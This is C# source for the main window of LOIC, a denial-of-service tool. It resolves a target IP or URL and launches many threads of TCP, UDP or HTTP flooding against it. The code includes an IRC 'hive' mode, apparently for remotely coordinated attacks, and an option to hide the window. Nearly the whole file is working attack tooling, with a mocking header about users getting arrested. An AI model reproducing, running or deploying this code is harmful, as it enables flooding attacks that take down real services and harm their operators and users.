/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

namespace LOIC
{
	#region using directives
	using System;
	using System.Collections.Generic;
	using System.Net;
	using System.Threading;
	using System.Windows.Forms;
	using System.Diagnostics;
	using Meebey.SmartIrc4net;
	#endregion

	public partial class frmMain : Form
	{
		#region Fields
		private static XXPFlooder[] xxpFlooders;
		private static HTTPFlooder[] httpFlooders;
		
		private static string sHost, sIP, sMethod, sData, sSubsite;
		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
		private static bool bResp, intShowStats;

		private static HiveManager hiveManager;
		
		private delegate void CheckParamsDelegate (List<string> pars);
		#endregion

		#region Properties
		private bool HiveEnabled
		{
			get { return hiveManager != null; }
		}
		#endregion
		
		#region Methods
		public frmMain (bool hive, bool hide, string ircserver, string ircport, string ircchannel)
		{
			InitializeComponent ();
			
			//Lets try this!
			if (hide) {
				this.WindowState = FormWindowState.Minimized;
				this.ShowInTaskbar = false;
			}
			
			this.FormClosing += frmMain_Closing;
			
			//IRC
			if (ircserver != "") {
				txtIRCserver.Text = ircserver;
			}
			if (ircport != "") {
				txtIRCport.Text = ircport;
			}
			if (ircchannel != "") {
				txtIRCchannel.Text = ircchannel;
			}
			
			if (hive)
			{
				enableHive.Checked = true;
			}
			else
			{
				disableHive.Checked = true;
			}
		}
		
		private void Attack (bool toggle, bool @on, bool silent)
		{
			if ((cmdAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle) || (!toggle && @on)) {
				try {
					try {
						iPort = Convert.ToInt32 (txtPort.Text);
					} catch {
						throw new Exception ("I don't think ports are supposed to be written like THAT.");
					}
					
					try {
						iThreads = Convert.ToInt32 (txtThreads.Text);
					} catch {
						throw new Exception ("What on earth made you put THAT in the threads field?");
					}
					
					sIP = txtTarget.Text;
					if (String.IsNullOrEmpty (sIP) || string.Equals (sIP, "N O N E !"))
						throw new Exception ("Select a target.");
					
					//Fix sHost
					try {
						if (sHost.Length > 0) {
							if (!sHost.Contains ("://")) {
								sHost = "http://" + sHost;
							}
							sHost = new Uri (sHost).Host;
						} else {
							sHost = sIP;
						}
					} catch {
						sHost = sIP;
					}
					
					iProtocol = 0;
					sMethod = cbMethod.Text;
					if (string.Equals (sMethod, "TCP"))
						iProtocol = 1;
					if (string.Equals (sMethod, "UDP"))
						iProtocol = 2;
					if (string.Equals (sMethod, "HTTP"))
						iProtocol = 3;
					if (iProtocol == 0)
						throw new Exception ("Select a proper attack method.");
					
					sData = txtData.Text.Replace ("\\r", "\r").Replace ("\\n", "\n");
					if (String.IsNullOrEmpty (sData) && (iProtocol == 1 || iProtocol == 2))
						throw new Exception ("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
					
					sSubsite = txtSubsite.Text;
					if (!sSubsite.StartsWith ("/") && (iProtocol == 3))
						throw new Exception ("You have to enter a subsite (for example \"/\")");
					
					try {
						iTimeout = Convert.ToInt32 (txtTimeout.Text);
					} catch {
						throw new Exception ("What's up with something like that in the timeout box? =S");
					}
					
					bResp = chkResp.Checked;
				} catch (Exception) {
					return;
				}
				
				cmdAttack.Text = "Stop flooding";
				
				if (string.Equals (sMethod, "TCP") || string.Equals (sMethod, "UDP")) {
					xxpFlooders = new XXPFlooder[iThreads];
					for (int a = 0; a < xxpFlooders.Length; a++) {
						xxpFlooders[a] = new XXPFlooder (sIP, iPort, iProtocol, iDelay, bResp, sData, chkMsgRandom.Checked);
						xxpFlooders[a].Start ();
					}
				}
				if (string.Equals (sMethod, "HTTP")) {
					httpFlooders = new HTTPFlooder[iThreads];
					for (int a = 0; a < httpFlooders.Length; a++) {
						httpFlooders[a] = new HTTPFlooder (sHost, sIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked);
						httpFlooders[a].Start ();
					}
				}
				
				tShowStats.Start ();
			} else if (toggle || !@on) {
				cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
				if (xxpFlooders != null) {
					for (int a = 0; a < xxpFlooders.Length; a++) {
						xxpFlooders[a].Stop();
					}
				}
				if (httpFlooders != null) {
					for (int a = 0; a < httpFlooders.Length; a++) {
						httpFlooders[a].Stop();
					}
				}
				//tShowStats.Stop();
			}
		}
		private void LockOnIP (bool silent)
		{
			if (txtTargetIP.Text.Length == 0) {
				if (silent)
					return;
				MessageBox.Show ("I think you forgot the IP.", "What the shit.");
				return;
			}
			txtTarget.Text = txtTargetIP.Text;
			sHost = txtTargetIP.Text;
		}
		
		private void LockOnURL (bool silent)
		{
			sHost = txtTargetURL.Text.ToLower ();
			if (sHost.Length == 0) {
				if (silent)
					return;
				MessageBox.Show ("A URL is fine too...", "What the shit.");
				return;
			}
			if (sHost.StartsWith ("https://"))
				sHost = sHost.Replace ("https://", "http://"); else if (!sHost.StartsWith ("http://"))
				sHost = String.Concat ("http://", sHost);
			try {
				txtTarget.Text = Dns.GetHostEntry (new Uri (sHost).Host).AddressList[0].ToString ();
			} catch {
				if (silent)
					return;
				MessageBox.Show ("The URL you entered does not resolve to an IP!", "What the shit.");
				return;
			}
		}
		
		private void DoHive (bool enabled)
		{
			try {
				//Is everything ok?
				if ((txtIRCserver.Text == "" || txtIRCchannel.Text == "") && enabled) {
					disableHive.Checked = true;
				} else if (enabled) {
					try {
						Dns.GetHostEntry (txtIRCserver.Text);
					} catch {
						disableHive.Checked = true;
					}
				}
				if (disableHive.Checked && enabled) {
					MessageBox.Show ("Did you filled IRC options correctly?", "What the shit.");
					return;
				}
				
				//We are starting connection. Disable input in IRC boxes.
				txtIRCserver.Enabled = !enabled;
				txtIRCport.Enabled = !enabled;
				txtIRCchannel.Enabled = !enabled;
				
				//Lets try this!
				if (enabled) {
					label25.Text = "Connecting..";
					
					int port;
					if (!int.TryParse (txtIRCport.Text, out port))
					{
						port = 6667;
					}
					
					hiveManager = new HiveManager (port, txtIRCserver.Text, txtIRCchannel.Text);
				} else {
					if (HiveEnabled)
					{
						hiveManager.Disconnect ();
					}

					label25.Text = "Disconnected.";
				}
			} catch {
			}
		}
		
		private void frmMain_Load (object sender, EventArgs e)
		{
			this.Text = string.Format ("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
		}

		private void frmMain_Closing (object sender, FormClosingEventArgs e)
		{
			if (HiveEnabled)
			{
				hiveManager.Disconnect ();
			}
			
			Environment.Exit (0);
		}

		private void cmdTargetURL_Click (object sender, EventArgs e)
		{
			LockOnURL (false);
		}

		private void cmdTargetIP_Click (object sender, EventArgs e)
		{
			LockOnIP (false);
		}

		private void txtTarget_Enter (object sender, EventArgs e)
		{
			cmdAttack.Focus ();
		}

		private void cmdAttack_Click (object sender, EventArgs e)
		{
			Attack (true, false, false);
		}

		private void tShowStats_Tick (object sender, EventArgs e)
		{
			if (intShowStats)
				return;
			intShowStats = true;
			
			bool isFlooding = false;
			if (cmdAttack.Text == "Stop for now")
				isFlooding = true;
			if (iProtocol == 1 || iProtocol == 2) {
				int iFloodCount = 0;
				for (int a = 0; a < xxpFlooders.Length; a++) {
					iFloodCount += xxpFlooders[a].FloodCount;
				}
				lbRequested.Text = iFloodCount.ToString ();
			}
			
			if (iProtocol == 3) {
				int iIdle = 0;
				int iConnecting = 0;
				int iRequesting = 0;
				int iDownloading = 0;
				int iDownloaded = 0;
				int iRequested = 0;
				int iFailed = 0;
				
				for (int a = 0; a < httpFlooders.Length; a++) {
					iDownloaded += httpFlooders[a].Downloaded;
					iRequested += httpFlooders[a].Requested;
					iFailed += httpFlooders[a].Failed;
					
					switch (httpFlooders[a].State) {
					case HTTPFlooder.RequestState.Ready:
					case HTTPFlooder.RequestState.Completed:
						iIdle++;
						break;
					case HTTPFlooder.RequestState.Connecting:
						iConnecting++;
						break;
					case HTTPFlooder.RequestState.Requesting:
						iRequesting++;
						break;
					case HTTPFlooder.RequestState.Downloading:
						iDownloading++;
						break;
					default:
						break;
					}
					
					if (isFlooding && !httpFlooders[a].IsFlooding) {
						int iaDownloaded = httpFlooders[a].Downloaded;
						int iaRequested = httpFlooders[a].Requested;
						int iaFailed = httpFlooders[a].Failed;
						httpFlooders[a] = null;
						httpFlooders[a] = new HTTPFlooder (sHost, sIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked);
						httpFlooders[a].Downloaded = iaDownloaded;
						httpFlooders[a].Requested = iaRequested;
						httpFlooders[a].Failed = iaFailed;
						httpFlooders[a].Start ();
					}
				}
				
				lbFailed.Text = iFailed.ToString ();
				lbRequested.Text = iRequested.ToString ();
				lbDownloaded.Text = iDownloaded.ToString ();
				lbDownloading.Text = iDownloading.ToString ();
				lbRequesting.Text = iRequesting.ToString ();
				lbConnecting.Text = iConnecting.ToString ();
				lbIdle.Text = iIdle.ToString ();
			}
			
			intShowStats = false;
		}

		private void tbSpeed_ValueChanged (object sender, EventArgs e)
		{
			iDelay = tbSpeed.Value;
			if (httpFlooders != null) {
				for (int a = 0; a < httpFlooders.Length; a++) {
					if (httpFlooders[a] != null)
						httpFlooders[a].Delay = iDelay;
				}
			}
			if (xxpFlooders != null) {
				for (int a = 0; a < xxpFlooders.Length; a++) {
					if (xxpFlooders[a] != null)
						xxpFlooders[a].Delay = iDelay;
				}
			}
		}

		private void enableHive_CheckedChanged (object sender, EventArgs e)
		{
			if (enableHive.Checked) {
				DoHive (true);
			}
		}

		private void disableHive_CheckedChanged (object sender, EventArgs e)
		{
			if (disableHive.Checked) {
				DoHive (false);
			}
		}
	}
	#endregion
}
